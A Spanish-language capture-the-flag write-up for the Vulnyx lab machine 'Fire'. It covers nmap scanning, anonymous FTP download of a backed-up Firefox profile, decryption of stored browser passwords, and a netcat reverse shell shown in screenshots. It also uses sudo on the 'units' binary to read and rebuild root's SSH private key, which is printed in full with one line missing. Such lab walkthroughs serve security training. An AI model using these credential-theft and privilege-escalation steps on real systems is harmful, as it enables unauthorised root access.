+++
title = 'Fire - Vulnyx'
+++

[link de descarga de la máquina Fire](https://mega.nz/file/hfwwgZQS#PrlxyDa-eAT_PtA66Qx1Hb255gpxCXKFhTUQkH75qpw)

---


## Escaneo de red con nmap para descubrir máquina objetivo

```bash
nmap -sn 10.38.1.0/24
```

![nmaphd](/images/writeups/vulnyx/fire/nmaphd.png)

### La IP de la máquina objetivo es **10.38.1.12**

## Escaneo de la máquina objetivo en busca de puertos abiertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.38.1.12 -oN target_scan.nmap
```

```bash
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: target_scan.nmap
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Sat Aug 24 15:01:37 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oN ta
       │ rget_scan.nmap 10.38.1.12
   2   │ Nmap scan report for 10.38.1.12
   3   │ Host is up, received arp-response (0.00020s latency).
   4   │ Scanned at 2024-08-24 15:01:37 EDT for 2s
   5   │ Not shown: 65531 closed tcp ports (reset)
   6   │ PORT     STATE SERVICE    REASON
   7   │ 21/tcp   open  ftp        syn-ack ttl 64
   8   │ 22/tcp   open  ssh        syn-ack ttl 64
   9   │ 80/tcp   open  http       syn-ack ttl 64
  10   │ 9090/tcp open  zeus-admin syn-ack ttl 64
  11   │ MAC Address: 08:00:27:3A:B2:BA (Oracle VirtualBox virtual NIC)
  12   │ 
  13   │ Read data files from: /usr/bin/../share/nmap
  14   │ # Nmap done at Sat Aug 24 15:01:39 2024 -- 1 IP address (1 host up) scanned in 2.60 seconds
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────  
```

### Puertos Abiertos: 21,22,80,9090


## Login al servicio FTP con usuario anonymous mediante script python y descarga de archivo backup.zip

```py
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: ftp_get_files.py
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ from ftplib import FTP
   2   │ 
   3   │ print("")
   4   │ 
   5   │ ftp = FTP('10.38.1.12','anonymous') 
   6   │ 
   7   │ print(ftp.login())
   8   │ 
   9   │ print("")
  10   │ 
  11   │ print("======================")
  12   │ print("FILES")
  13   │ print("======================\n")
  14   │ 
  15   │ files = ftp.nlst()
  16   │ 
  17   │ for file in files:
  18   │     print(file)
  19   │     with open(file, 'wb') as f:
  20   │         ftp.retrbinary(f'RETR {file}', f.write)
  21   │     
  22   │ print("")
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 
```

```bash
➜ python3 ftp_get_files.py 

230 Login successful.

======================
FILES
======================

backup.zip  
```

```bash
unzip backup.zip
---------------------------------------------------------------------------------------------------

➜ tree mozilla -d

mozilla
└── firefox
    ├── 3m1uu7kd.default
    ├── Crash Reports
    │   └── events
    ├── kzf86n13.default-esr
    │   └── storage
    │       └── default
    │           └── moz-extension+++98162e61-f929-4618-b8e8-9f4396fb4a0a^userContextId=4294967295
    │               └── idb
    ├── pe1jatah.default-esr
    │   ├── bookmarkbackups
    │   ├── browser-extension-data
    │   │   └── amazondotcom@search.mozilla.org
    │   ├── crashes
    │   │   └── events
    │   ├── datareporting
    │   │   └── glean
    │   │       ├── db
    │   │       ├── events
    │   │       └── pending_pings
    │   ├── features
    │   │   └── {ebea8519-eb5a-47db-a654-95fa868f87c8}
    │   ├── minidumps
    │   ├── security_state
    │   ├── sessionstore-backups
    │   ├── settings
    │   └── storage
    │       ├── default
    │       │   └── moz-extension+++db464e70-860a-407b-a641-d1e483f24a70^userContextId=4294967295
    │       │       └── idb
    │       │           └── 3647222921wleabcEoxlt-eengsairo.files
    │       ├── permanent
    │       │   └── chrome
    │       │       └── idb
    │       │           ├── 1451318868ntouromlalnodry--epcr.files
    │       │           ├── 1657114595AmcateirvtiSty.files
    │       │           ├── 2823318777ntouromlalnodry--naod.files
    │       │           ├── 2918063365piupsah.files
    │       │           ├── 3561288849sdhlie.files
    │       │           └── 3870112724rsegmnoittet-es.files
    │       │               └── journals
    │       └── temporary
    └── Pending Pings

44 directories
```

## Credenciales del usuario marco

[firefox_decrypt](https://github.com/unode/firefox_decrypt)


```bash
  
➜ python firefox_decrypt.py ../mozilla/firefox/

Select the Mozilla profile you wish to decrypt
1 -> 3m1uu7kd.default
2 -> pe1jatah.default-esr

2

Website:   http://localhost
Username: 'marco'
Password: 'm@rc0!123'
```

![marco creds service port 9090](/images/writeups/vulnyx/fire/marcocreds9090.png)

## Reverse shell con netcat

![revshell](/images/writeups/vulnyx/fire/revshell.png)

![revshell](/images/writeups/vulnyx/fire/revshell2.png)


## Flag del usuario marco

```bash
marco@fire:~$ cat user.txt  
5400****************************
```

## Permisos sudo del usuario marco 

```bash
marco@fire:~$ sudo -l

Matching Defaults entries for marco on fire:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User marco may run the following commands on fire:
    (root) NOPASSWD: /usr/bin/units  
```

## Escalada de privilegios con binario /usr/bin/units

```bash
marco@fire:~$ sudo /usr/bin/units -f /root/.ssh/id_rsa
```

```bash
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: id_rsa_root_dirty
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ units: unit '-----BEGIN' in units file '/root/.ssh/id_rsa' on line 1 ignored.  It contains invalid character '-'
   3   │ units: unit 'MIIEowIBAAKCAQEA4zyTaEdG9ndkXzil42utXutJCywNF5siqTqPYP8e2OfNCA26' lacks a definition at line 2 of '/
       │ root/.ssh/id_rsa'
   4   │ units: unit 'hLDrlYAhzXDi/zQA+2IteiKtzJBAX3F9ZLqZRkkFswpjW7OeP3uq/OkAppLRrWff' lacks a definition at line 3 of '/
       │ root/.ssh/id_rsa'
   5   │ units: unit '25TX5BZAFw7le1gzCNnA5U7SPQWZMkCdC+JAxrx3pkX0MLI5hn5UTNuZkl4XCozV' lacks a definition at line 4 of '/
       │ root/.ssh/id_rsa'
   6   │ units: unit 'IUmrErfyWhydNlAIGJhfMiJ8EC6+BY+/oW9XN2YoVR8a0sLz0gWHAAKRQkQMqjPn' lacks a definition at line 5 of '/
       │ root/.ssh/id_rsa'
   7   │ units: unit 'A6cnfeXO6KprGq2O0ev81FhBeVqkrrrvSHvNSXrvqNL/N8fPZVD452ene3CVvQIm' lacks a definition at line 6 of '/
       │ root/.ssh/id_rsa'
   8   │ units: unit 'ohjNikvqqnLhCM4Hl/CtQL8w1rl+Uih19mfiuQIDAQABAoIBAQCLiqZm0eZ08cpU' lacks a definition at line 7 of '/
       │ root/.ssh/id_rsa'
   9   │ units: unit 'YyATsQrtEAVx8+IyTdUSIODtSp1xy57vxCZ214JD80ROuXTcDN5RgO+2YddimG6/' lacks a definition at line 8 of '/
       │ root/.ssh/id_rsa'
  10   │ units: unit 'bZz4H1KCg9MZKFbteDbEezf8SUVaBSz3lKM2X4fYDAXdYwtvHDFyzO2Uozudt3Nl' lacks a definition at line 9 of '/
       │ root/.ssh/id_rsa'
  11   │ units: unit 'FaKbKpxmrlO3apvSz49d1PQFopEC/NY/jVl3o3tReriYC+DIgYaY/i8kZTHL8eY8' lacks a definition at line 10 of '  
       │ /root/.ssh/id_rsa'
  12   │ units: unit 'x8OMDIFag7CnPMDVGsmyTwvVwao1GNR6KZxI+j9caOtaurzxd9vnEzYim2e1dLDA' lacks a definition at line 11 of '
       │ /root/.ssh/id_rsa'
  13   │ units: unit 'K2EfYUssTu+9QiSVOk1TUaiGiZU11he4H3lMzDjEq4epRGwwyQUdE3B/cBpSDClH' lacks a definition at line 12 of '
       │ /root/.ssh/id_rsa'
  14   │ units: unit 'HX4Ph7KBAoGBAPj7v+IsC0XTGWTXjKclDn/Ah6COXRAWMJRkiQCK8hi8FtAqxgwQ' lacks a definition at line 13 of '
       │ /root/.ssh/id_rsa'
  15   │ units: unit '08eNxg57Dn7284DahjOMJYXtuY9P+jOoYg26ICazkwg+BnsZvfEjJxvFMXnYnDyw' lacks a definition at line 14 of '
       │ /root/.ssh/id_rsa'
  16   │ units: unit 'Z1w0MOPR5S9p/9gTLinHEIt+rGS4rOZXd9llVq187i+FyiB/L9nWTDxRAoGBAOmj' lacks a definition at line 15 of '
       │ /root/.ssh/id_rsa'
  17   │ units: unit '8AyUkAiJYBY/lX8TS8EORBpUljpfTPfmg6s19pwxP4K9hUkW1MNduBth3Nw6FRRZ' lacks a definition at line 16 of '
       │ /root/.ssh/id_rsa'
  18   │ units: unit '2jm4Gw6k+l9+MAsyoOldD5SFezX7bfll4+pqWG/CRKnnE4Ot7OXvSeab6U2cpLhB' lacks a definition at line 17 of '
       │ /root/.ssh/id_rsa'
  19   │ units: unit 'UKLM9vVvCbS3608twDg42DZ22bPEjNnc02puzu3pAoGAFC1apHqLQ1JTKX/qTxVK' lacks a definition at line 18 of '
       │ /root/.ssh/id_rsa'
  20   │ units: unit 'soGovBMtaYNS1oO7MocQDX8YnjAJMqsebnqHxV6lkxZyL0wGOiEuXUchlYKWtR79' lacks a definition at line 19 of '
       │ /root/.ssh/id_rsa'
  21   │ units: unit 'Kz2dI2XEEZPtNIamhOcjYTW+x7ANIUHubmNwXtYAq7H8YMdVI1+VcKiIUfVBVb1a' lacks a definition at line 20 of '
       │ /root/.ssh/id_rsa'
  22   │ units: unit '4gw7VP3d044VDkMgXpfmP7ECgYB4r7sm9HK2RigBNhUGEDSYY8MgCsOTIXlDsKog' lacks a definition at line 21 of '
       │ /root/.ssh/id_rsa'
  23   │ units: unit '/X4GzpWs9jLsP0PmKvoYAuQwSjxrR8KnAAfR97xxKWCt2Bgwk2ah5JVxnBABvPUP' lacks a definition at line 22 of '
       │ /root/.ssh/id_rsa'
  24   │ units: unit 'OKG4ERSg4wE8itINMB7vZWgNNDYOC4cYoWGMBDByTnLZcpuRLyPYdmocJxJO03fN' lacks a definition at line 23 of '
       │ /root/.ssh/id_rsa'
  25   │ units: unit 'ybFQSQKBgA9X6z0WlFOWUqx7OcIhbeVAiYisi+582Wt2G+aUVM71S49gk5lxh1Oe' lacks a definition at line 24 of '
       │ /root/.ssh/id_rsa'
  26   │ units: unit '+IxWgWsAvedbz9YigaVeZ/X1seIRs97IhZszK6QYMYsdJ/bu6Qzrd/pibLT52nDD' lacks a definition at line 25 of '
       │ /root/.ssh/id_rsa'
  27   │ units: unit '/7EWKpTCqpAyAmdNA/B0jMprzP/4njtuOfvGbjDrv0jQ8qyJCv0r' lacks a definition at line 26 of '/root/.ssh/i
       │ d_rsa'
  28   │ units: unit '-----END' in units file '/root/.ssh/id_rsa' on line 27 ignored.  It contains invalid character '-'
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```


```bash
cat id_rsa_root_dirty | awk '{print $3}' | sed "s/[']//g" > id_rsa_root 
```

### Formato correcto

```bash
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: id_rsa_root
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ -----BEGIN RSA PRIVATE KEY-----
   2   │ MIIEowIBAAKCAQEA4zyTaEdG9ndkXzil42utXutJCywNF5siqTqPYP8e2OfNCA26
   3   │ hLDrlYAhzXDi/zQA+2IteiKtzJBAX3F9ZLqZRkkFswpjW7OeP3uq/OkAppLRrWff
   4   │ 25TX5BZAFw7le1gzCNnA5U7SPQWZMkCdC+JAxrx3pkX0MLI5hn5UTNuZkl4XCozV
   5   │ IUmrErfyWhydNlAIGJhfMiJ8EC6+BY+/oW9XN2YoVR8a0sLz0gWHAAKRQkQMqjPn
   6   │ A6cnfeXO6KprGq2O0ev81FhBeVqkrrrvSHvNSXrvqNL/N8fPZVD452ene3CVvQIm
   7   │ ohjNikvqqnLhCM4Hl/CtQL8w1rl+Uih19mfiuQIDAQABAoIBAQCLiqZm0eZ08cpU
   8   │ YyATsQrtEAVx8+IyTdUSIODtSp1xy57vxCZ214JD80ROuXTcDN5RgO+2YddimG6/
   9   │ bZz4H1KCg9MZKFbteDbEezf8SUVaBSz3lKM2X4fYDAXdYwtvHDFyzO2Uozudt3Nl
  10   │ FaKbKpxmrlO3apvSz49d1PQFopEC/NY/jVl3o3tReriYC+DIgYaY/i8kZTHL8eY8
  11   │ x8OMDIFag7CnPMDVGsmyTwvVwao1GNR6KZxI+j9caOtaurzxd9vnEzYim2e1dLDA
  12   │ K2EfYUssTu+9QiSVOk1TUaiGiZU11he4H3lMzDjEq4epRGwwyQUdE3B/cBpSDClH
  13   │ HX4Ph7KBAoGBAPj7v+IsC0XTGWTXjKclDn/Ah6COXRAWMJRkiQCK8hi8FtAqxgwQ
  14   │ 08eNxg57Dn7284DahjOMJYXtuY9P+jOoYg26ICazkwg+BnsZvfEjJxvFMXnYnDyw
  15   │ Z1w0MOPR5S9p/9gTLinHEIt+rGS4rOZXd9llVq187i+FyiB/L9nWTDxRAoGBAOmj
  16   │ 8AyUkAiJYBY/lX8TS8EORBpUljpfTPfmg6s19pwxP4K9hUkW1MNduBth3Nw6FRRZ
  17   │ 2jm4Gw6k+l9+MAsyoOldD5SFezX7bfll4+pqWG/CRKnnE4Ot7OXvSeab6U2cpLhB
  18   │ UKLM9vVvCbS3608twDg42DZ22bPEjNnc02puzu3pAoGAFC1apHqLQ1JTKX/qTxVK
  19   │ soGovBMtaYNS1oO7MocQDX8YnjAJMqsebnqHxV6lkxZyL0wGOiEuXUchlYKWtR79
  20   │ Kz2dI2XEEZPtNIamhOcjYTW+x7ANIUHubmNwXtYAq7H8YMdVI1+VcKiIUfVBVb1a
  22   │ /X4GzpWs9jLsP0PmKvoYAuQwSjxrR8KnAAfR97xxKWCt2Bgwk2ah5JVxnBABvPUP
  23   │ OKG4ERSg4wE8itINMB7vZWgNNDYOC4cYoWGMBDByTnLZcpuRLyPYdmocJxJO03fN
  24   │ ybFQSQKBgA9X6z0WlFOWUqx7OcIhbeVAiYisi+582Wt2G+aUVM71S49gk5lxh1Oe
  25   │ +IxWgWsAvedbz9YigaVeZ/X1seIRs97IhZszK6QYMYsdJ/bu6Qzrd/pibLT52nDD
  26   │ /7EWKpTCqpAyAmdNA/B0jMprzP/4njtuOfvGbjDrv0jQ8qyJCv0r
  27   │ -----END RSA PRIVATE KEY-----
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 
```


```bash
➜ chmod 600 id_rsa_root

➜ ssh -i id_rsa_root root@10.38.1.12 
```

## Flag del usuario root

```bash
root@fire:~# cd /root
root@fire:~# ls
root.txt
root@fire:~# cat root.txt
5df1****************************
```


